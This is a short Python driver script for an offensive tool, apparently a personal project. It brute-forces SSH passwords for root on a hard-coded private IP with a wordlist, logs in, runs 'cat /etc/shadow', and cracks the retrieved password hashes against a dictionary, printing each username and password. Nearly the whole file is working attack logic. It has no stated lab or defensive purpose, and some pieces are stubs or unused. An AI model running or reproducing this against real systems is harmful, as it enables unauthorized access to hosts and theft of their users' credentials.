#!/usr/bin/env python3
# coding=utf-8
__author__="riverchu"

import optparse

from scan import resolveIP
from brute import bruteSSH,loginSSH,bruteUnixPasswd

def brute(host,user,dictionary,*,connections):
    target=(host,user)
    dic = dict()
    dic['passwdFile']=dictionary
    dic['maxConnection']=connections

    info = bruteSSH.bruteSSH(*target,**dic)

    return info

def login(loginInfo):
    if loginInfo['type']=='password' and loginInfo['key']!=None:
        return loginSSH.start_ssh(loginInfo['host'],loginInfo['user'],loginInfo['key'])

def scan():
    pass

def main(host,user,dictionary,*,connections=10):
    for i in resolveIP.resolveIP('10.108.36.71'):
        pass
    info = brute(host,user,dictionary,connections=connections)
    if not info['key']:return
    handle = login(info)
    if handle:
        ret = loginSSH.send_command(handle,'cat /etc/shadow')
        t = ret.split('\n')
        for line in ret.split('\n')[:-1]:
            passwdInfo = bruteUnixPasswd.crack_unix_passwd(line,dic='./data/dictionary.txt')
            print('user:',passwdInfo[0],'\tpassword:',passwdInfo[1])

if __name__=="__main__":
    host = '10.108.36.71'
    user = 'root'
    dictionary = './data/dictionary.txt'
    main(host,user,dictionary)
